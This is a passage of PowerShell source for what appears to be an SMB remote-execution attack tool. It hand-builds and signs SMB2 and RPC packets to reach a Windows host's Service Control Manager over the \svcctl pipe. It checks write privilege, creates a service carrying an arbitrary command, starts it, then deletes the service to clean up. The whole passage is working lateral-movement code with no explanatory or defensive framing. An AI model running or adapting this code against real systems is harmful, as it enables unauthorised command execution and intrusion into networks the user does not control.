                        $packet_SMB_header = New-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeDisconnectRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Logoff'
                    }

                }
            
            }

        }  
        else
        {
            
            $stage = 'TreeConnect'

            try
            {

                while ($stage -ne 'Exit')
                {

                    switch ($stage)
                    {
                
                        'CheckAccess'
                        {

                            if([System.BitConverter]::ToString($client_receive[128..131]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($client_receive[108..127]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                            {

                                $SMB_service_manager_context_handle = $client_receive[108..127]
                                
                                if($SMB_execute -eq $true)
                                {
                                    Write-Verbose "$output_username has Service Control Manager write privilege on $Target"
                                    $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                                    $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                                    if($SCM_data.Length -lt $SMB_split_index)
                                    {
                                        $stage = 'CreateServiceW'
                                    }
                                    else
                                    {
                                        $stage = 'CreateServiceW_First'
                                    }

                                }
                                else
                                {
                                    Write-Output "[+] $output_username has Service Control Manager write privilege on $Target"
                                    $SMB_close_service_handle_stage = 2
                                    $stage = 'CloseServiceHandle'
                                }

                            }
                            elseif([System.BitConverter]::ToString($client_receive[128..131]) -eq '05-00-00-00')
                            {
                                Write-Output "[-] $output_username does not have Service Control Manager write privilege on $Target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                Write-Output "[-] Something went wrong with $Target"
                                $stage = 'Exit'
                            }

                        }

                        'CloseRequest'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
        
                            $packet_SMB2_data = New-PacketSMB2CloseRequest $file_ID
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }

                        'CloseServiceHandle'
                        {

                            if($SMB_close_service_handle_stage -eq 1)
                            {
                                Write-Verbose "Service $SMB_service deleted on $Target"
                                $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle
                            }
                            else
                            {
                                $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                            }

                            $SMB_close_service_handle_stage++
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)     
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $stage = 'SendReceive'
                        }
                    
                        'CreateRequest'
                        {
                            $stage_current = $stage
                            $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes
                            $packet_SMB2_data["Share_Access"] = 0x07,0x00,0x00,0x00  
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data  
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                            try
                            {
                                $client_stream.Write($client_send,0,$client_send.Length) > $null
                                $client_stream.Flush()
                                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                                if(Get-StatusPending $client_receive[12..15])
                                {
                                    $stage = 'StatusPending'
                                }
                                else
                                {
                                    $stage = 'StatusReceived'
                                }

                            }
                            catch
                            {
                                Write-Output "[-] Session connection is closed"
                                $stage = 'Exit'
                            }                    

                        }

                        'CreateServiceW'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $stage = 'SendReceive'
                        }

                        'CreateServiceW_First'
                        {
                            $stage_current = $stage
                            $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                            $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                            $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
                            $SMB_split_index_tracker = $SMB_split_index
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                            $stage = 'SendReceive'
                        }

                        'CreateServiceW_Middle'
                        {
                            $stage_current = $stage
                            $SMB_split_stage++
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                            $SMB_split_index_tracker += $SMB_split_index
                            $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                            $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                            $stage = 'SendReceive'
                        }

                        'CreateServiceW_Last'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                            $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                            $stage = 'SendReceive'
                        }

                        'DeleteServiceW'
                        { 

                            if([System.BitConverter]::ToString($client_receive[108..111]) -eq '1d-04-00-00')
                            {
                                Write-Output "[+] Command executed with service $SMB_service on $Target"
                            }
                            elseif([System.BitConverter]::ToString($client_receive[108..111]) -eq '02-00-00-00')
                            {
                                Write-Output "[-] Service $SMB_service failed to start on $Target"
                            }

                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                            }

                            $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $stage = 'SendReceive'
                        }

                        'Logoff'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
            
                            $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }

                        'OpenSCManagerW'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $stage = 'SendReceive'
                        }

                        'ReadRequest'
                        {
                            Start-Sleep -m $Sleep
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2ReadRequest $file_ID
                            $packet_SMB2_data["Length"] = 0xff,0x00,0x00,0x00
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data 
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                            $stage = 'SendReceive'
                        }
                    
                        'RPCBind'
                        {
                            $stage_current = $stage
                            $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 $named_pipe_UUID 0x02,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                            $stage = 'SendReceive'
                        }

                        'SendReceive'
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if(Get-StatusPending $client_receive[12..15])
                            {
                                $stage = 'StatusPending'
                            }
                            else
                            {
                                $stage = 'StatusReceived'
                            }

                        }

                        'StartServiceW'
                        {
                        
                            if([System.BitConverter]::ToString($client_receive[132..135]) -eq '00-00-00-00')
                            {
                                Write-Verbose "Service $SMB_service created on $Target"
                                $SMB_service_context_handle = $client_receive[112..131]
                                $stage_current = $stage
                                $message_ID++
                                $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                                if($SMB_signing)
                                {
                                    $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                                }

                                $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                                $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                                $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                                $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data   
                                $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                                if($SMB_signing)
                                {
                                    $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                    $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                    $SMB2_signature = $SMB2_signature[0..15]
                                    $packet_SMB2_header["Signature"] = $SMB2_signature
                                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                                }

                                $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                Write-Verbose "[*] Trying to execute command on $Target"
                                $stage = 'SendReceive'
                            }
                            elseif([System.BitConverter]::ToString($client_receive[132..135]) -eq '31-04-00-00')
                            {
                                Write-Output "[-] Service $SMB_service creation failed on $Target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                Write-Output "[-] Service creation fault context mismatch"
                                $stage = 'Exit'
                            }
    
                        }
                
                        'StatusPending'
                        {
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            
                            if([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')
                            {
                                $stage = 'StatusReceived'
                            }

                        }

                        'StatusReceived'
                        {

                            switch ($stage_current)
                            {

                                'CloseRequest'
                                {
                                    $stage = 'TreeDisconnect'
                                }

                                'CloseServiceHandle'
                                {

                                    if($SMB_close_service_handle_stage -eq 2)
                                    {
                                        $stage = 'CloseServiceHandle'
                                    }
                                    else
                                    {
                                        $stage = 'CloseRequest'
                                    }

                                }

                                'CreateRequest'
                                {
                                    $file_ID = $client_receive[132..147]

                                    if($Refresh -and $stage -ne 'Exit')
                                    {
                                        Write-Output "[+] Session refreshed"
                                        $stage = 'Exit'
                                    }
                                    elseif($stage -ne 'Exit')
                                    {
                                        $stage = 'RPCBind'
                                    }

                                }

                                'CreateServiceW'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'StartServiceW'
                                }

                                'CreateServiceW_First'
                                {

                                    if($SMB_split_stage_final -le 2)
                                    {
                                        $stage = 'CreateServiceW_Last'
                                    }
                                    else
                                    {
                                        $SMB_split_stage = 2
                                        $stage = 'CreateServiceW_Middle'
                                    }
                                    
                                }

                                'CreateServiceW_Middle'
                                {

                                    if($SMB_split_stage -ge $SMB_split_stage_final)
                                    {
                                        $stage = 'CreateServiceW_Last'
                                    }
                                    else
                                    {
                                        $stage = 'CreateServiceW_Middle'
                                    }

                                }

                                'CreateServiceW_Last'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'StartServiceW'
                                }

                                'DeleteServiceW'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'CloseServiceHandle'
                                    $SMB_close_service_handle_stage = 1
                                }

                                'Logoff'
                                {
                                    $stage = 'Exit'
                                }

                                'OpenSCManagerW'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'CheckAccess' 
                                }

                                'ReadRequest'
                                {
                                    $stage = $stage_next
                                }

                                'RPCBind'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'OpenSCManagerW'
                                }

                                'StartServiceW'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'DeleteServiceW'  
                                }

                                'TreeConnect'
                                {
                                    $tree_ID = $client_receive[40..43]
                                    $stage = 'CreateRequest'
                                }

                                'TreeDisconnect'
                                {

                                    if($inveigh_session -and !$Logoff)
                                    {
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $stage = 'Logoff'
                                    }

                                }

                            }

                        }
                    
                        'TreeConnect'
                        {
                            $tree_ID = $client_receive[40..43]
                            $message_ID++
                            $stage_current = $stage
                            $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data 
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                            try
                            {
                                $client_stream.Write($client_send,0,$client_send.Length) > $null
                                $client_stream.Flush()
